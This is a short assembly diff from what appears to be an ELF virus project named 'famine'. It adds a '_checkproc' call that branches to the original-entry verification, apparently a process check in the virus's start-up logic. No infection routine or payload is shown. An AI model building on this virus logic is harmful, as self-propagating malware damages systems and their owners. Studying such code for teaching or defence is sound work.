@@ -63,6 +63,10 @@ _start:
 	cmp rax, 0
 	jne _verify_o_entry
 
+	call _checkproc
+	cmp rax, 0
+	jne _verify_o_entry
+
 	;; If _o_entry label equals zero, we are into ./famine so we look for eventual arguments
 	lea		rax, [rel _o_entry]
 	cmp		QWORD [rax], 0
